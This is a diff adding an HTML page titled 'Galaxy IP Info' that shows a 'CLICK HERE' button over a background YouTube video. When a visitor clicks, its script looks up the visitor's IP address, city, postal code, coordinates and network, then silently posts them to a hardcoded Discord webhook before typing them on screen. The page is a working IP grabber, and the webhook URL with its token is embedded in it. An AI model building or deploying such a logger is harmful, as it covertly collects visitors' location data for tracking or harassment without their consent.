@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Galaxy IP Info</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Orbitron', sans-serif;
+      background: black;
+    }
+    #bgContainer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      overflow: hidden;
+    }
+    #clickBtn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 4em;
+      padding: 25px 60px;
+      border: 3px solid red;
+      background: transparent;
+      color: red;
+      cursor: pointer;
+      letter-spacing: 6px;
+      text-shadow: 0 0 10px red, 0 0 25px red;
+      z-index: 10;
+    }
+    #clickBtn:hover {
+      text-shadow: 0 0 40px red, 0 0 80px red;
+      border-color: #ff4444;
+      color: #ff4444;
+    }
+    #infoBox {
+      display: none;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 3px solid red;
+      padding: 40px 60px;
+      background: rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 30px red;
+      text-align: left;
+      max-width: 800px;
+      white-space: pre-line;
+      font-size: 1.6em;
+      color: red;
+      text-shadow: 0 0 20px red;
+      z-index: 5;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="bgContainer"></div>
+
+  <button id="clickBtn">CLICK HERE</button>
+  <div id="infoBox"></div>
+
+  <script src="https://www.youtube.com/iframe_api"></script>
+
+  <script>
+    let player;
+    const videoId = "KvT7H5-RJGA"; // Your video ID
+    const webhook = "https://canary.discord.com/api/webhooks/1416561013838577777/3C4Aj0eLNK8oi9_NQOQTXE6DY3m5fXWC3wcAQIq-LxO1-EOrqcUOEGFRriQ-JV8KxBMJ";
+
+    function onYouTubeIframeAPIReady() {
+      player = new YT.Player('bgContainer', {
+        height: '100%',
+        width: '100%',
+        videoId: videoId,
+        playerVars: {
+          autoplay: 0,        // Start manually after click
+          controls: 0,        // Hide controls
+          modestbranding: 1,  // Minimal branding
+          showinfo: 0,        // Hide info
+          loop: 1,
+          playlist: videoId
+        },
+        events: {
+          onReady: (event) => {}
+        }
+      });
+    }
+
+    document.getElementById('clickBtn').onclick = async () => {
+      document.getElementById('clickBtn').remove();
+
+      // Play video with audio
+      if(player && player.playVideo) {
+        player.playVideo();
+        player.unMute();
+      }
+
+      // Get IP info
+      const res = await fetch('https://ipapi.co/json/');
+      const data = await res.json();
+
+      const ipInfo = `
+IP Address: ${data.ip}
+Network: ${data.org}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+Postal Code: ${data.postal}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Timezone: ${data.timezone}
+Currency: ${data.currency}
+ASN: ${data.asn}
+`;
+
+      // Send info to Discord
+      await fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: "```" + ipInfo + "```"})
+      });
+
+      // Type info slowly inside the box
+      const infoDiv = document.getElementById('infoBox');
+      infoDiv.style.display = 'block';
+      let i = 0;
+      function typeWriter() {
+        if (i < ipInfo.length) {
+          infoDiv.textContent += ipInfo.charAt(i);
+          i++;
+          setTimeout(typeWriter, 60);
+        }
+      }
+      typeWriter();
+    };
+  </script>
+</body>
+</html>
